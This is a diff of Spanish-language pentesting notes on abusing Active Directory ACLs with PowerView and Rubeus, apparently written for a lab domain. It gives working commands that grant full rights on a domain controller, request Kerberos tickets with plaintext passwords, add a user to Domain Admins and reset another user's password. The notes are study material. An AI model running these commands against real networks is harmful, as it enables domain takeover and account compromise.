@@ -4,6 +4,8 @@ Tags: #AD #ACL #PowerView
 
 ## Análisis del ACE
 
+* [ACL y ACE](https://learn.microsoft.com/es-es/windows/win32/secauthz/dacls-and-aces)
+
 ```bash 
 1. ObjectDN: Especifica el objeto sobre el cual se aplican los derechos. Aquí, 'CN=FIRST-DC,OU=Domain Controllers,DC=domain1,DC=corp' indica que el objeto es el controlador de dominio 'FIRST-DC' dentro del dominio 'domain1.corp'.
     
@@ -26,7 +28,7 @@ Nota: Si un atacante compromete la cuenta 'writedacldc.user', podría abusar del
 ```bash 
 1. GenericAll
 - Derechos totales sobre el objeto.
-- Uso por un atacante**: Este permiso otorga control total sobre un objeto. Un atacante podría agregar usuarios a grupos, restablecer contraseñas o modificar cualquier aspecto del objeto en cuestión.
+- Uso por un atacante: Este permiso otorga control total sobre un objeto. Un atacante podría agregar usuarios a grupos, restablecer contraseñas o modificar cualquier aspecto del objeto en cuestión.
 
 2. GenericWrite
 - Actualización de los atributos del objeto.
@@ -91,25 +93,93 @@ Nota: Si un atacante compromete la cuenta 'writedacldc.user', podría abusar del
 ```
 
 ```powershell 
-❯ Get-ObjectAcl Object-Name -ResolveGUIDs
-❯ Find-InterestingDomainAcl
+❯ Get-ObjectAcl Object-Name -ResolveGUIDs    
 
-❯ Get-ObjectAcl | select AceType,SecurityIdentifier,ActiveDirectoryRights,ObjectDN | Format-List 
+❯ Get-ObjectAcl | select AceType,SecurityIdentifier,ActiveDirectoryRights,ObjectDN | Format-List  # Enumerar ACL - ACE
 
 Nota: En los ACE podemos encontrar este tipo de identificadores:
-	# SID cortas 'S-1-5-9' = Grupos por defecto en AD
-	# SID medianas 'S-1-5-32-557' = Grupos de Operadores 
-	# SID largas 'S-1-5-21-1861162130-2580302541-221646211-1124' = Pertenece a un usuario 
+	# Security-ID cortas 'S-1-5-9' = Grupos por defecto en AD
+	# Security-ID medianas 'S-1-5-32-557' = Grupos de Operadores 
+	# Object-SID 'S-1-5-21-1861162130-2580302541-221646211-1124' = Pertenece a un usuario 
 
 ❯ Convert-SidToName SID      # Convierte el numero SID al nombre que le pertenece 
 ```
 
 ```powershell 
-❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier)}
+❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} 
 
-	# % = Es un bucle como 'foreach'
-	# $_ = Objetos que tenemos por 'detras' 
-	# $ = Ejecutaremos un comando
+	# %{} = Es un bucle como un 'foreach'
+	# $_ = Objetos que tenemos por 'detras', cada ACL
+	# $() = Ejecutaremos un comando
 	# $_. = Llamamos a un atributo en este caso a 'Security-Identifier'
+
+❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} | select AceType,IdentityName,ActiveDirectoryRights,ObjectDN | fl 
+
+	# IdentityName = Es un 'grupo o usuario'
+	# ActiveDirectoryRights = Muestra los permisos que tiene el 'grupo o usuario'
+	# ObjectDN = El objeto sobre el cual se tienen los permisos 
+
+
+# Aplicamos una sentencia donde si es verdadero nos muestra la info y buscara solo las ACL que muestren 'adminwebserver' esto con el fin de ver que permisos tiene sobre que objeto
+❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} | ?{$_.IdentityName -match 'adminwebserver'} | select AceType,IdentityName,ActiveDirectoryRights,ObjectDN | fl 
 ```
 
+```powershell
+❯ Find-InterestingDomainAcl                  # Buscar permisos que sean altamente explotables 
+
+❯ Find-InterestingDomainAcl | select AceType,IdentityReferenceName,ActiveDirectoryRights,ObjectDN | fl  
+
+	# IdentityReferenceName = Nos regresa el nombre traducido del SID
+```
+
+## Escribir DACL sobre el PC
+
+```powershell
+❯ Import-Module .\PowerView-3.0.ps1
+
+❯ $SecPassword = ConvertTo-SecureString 'Password@1' -AsPlainText -Force 
+
+❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.corp\writedacldc.user', $SecPassword)
+
+❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'CN=FIRST-DC,OU=Domain Controllers,DC=domain1,DC=corp' -PrincipalIdentity user.hacked -Rights All -Verbose
+```
+
+```bash 
+Con los permisos 'All' otorgados al usuario 'user.hacked' en un objeto específico del Controlador de Dominio en Active Directory, el usuario podría realizar una amplia gama de acciones, incluyendo:
+
+1. Modificar Configuraciones del Controlador de Dominio: Cambiar configuraciones críticas del Controlador de Dominio.
+2. Modificar Políticas de Grupo: Cambiar políticas que afectan a todos los usuarios y computadoras del dominio.
+3. Acceder a Datos Sensibles: Leer información sensible almacenada en el Controlador de Dominio.
+4. Crear o Eliminar Cuentas de Usuario: Potencialmente crear cuentas de administrador o eliminar cuentas existentes.
+5. Cambiar Permisos y Derechos de Otros Usuarios: Modificar los derechos de acceso de otros usuarios en el dominio.
+```
+
+## GenericAll sobre Grupo
+
+```powershell
+❯ import-module .\Microsoft.ActiveDirectory.Management.dll
+❯ Get-ADGroup "Domain Admins" -Properties * | select -ExpandProperty ntSecurityDescriptor | Format-List
+❯ ./Rubeus.exe asktgt /user:groupwrite.user /password:Password@1 /ptt
+❯ klist
+❯ net group "domain admins" /domain
+❯ net group "domain admins" user.hacked /add /domain
+```
+
+## GenericAll sobre usuario
+
+```powershell
+❯ $user = Get-ADUser -Identity "userall.user"
+❯ $user.SID
+❯ Get-ObjectAcl -SamAccountName userwrite.user -ResolveGUIDs | Where-Object
+❯ ./Rubeus.exe asktgt /user:userall.user /password:Password@1 /ptt
+❯ klist
+❯ net user userwrite.user P4ssw0rd /domain
+```
+
+## GenericWrite sobre computador
+
+```powershell
+❯ $user = Get-ADUser -Identity "compwrite.user"
+❯ $user.SID
+❯ Get-ObjectAcl -SamAccountName First-DC -ResolveGUIDs | Where-Object
+```
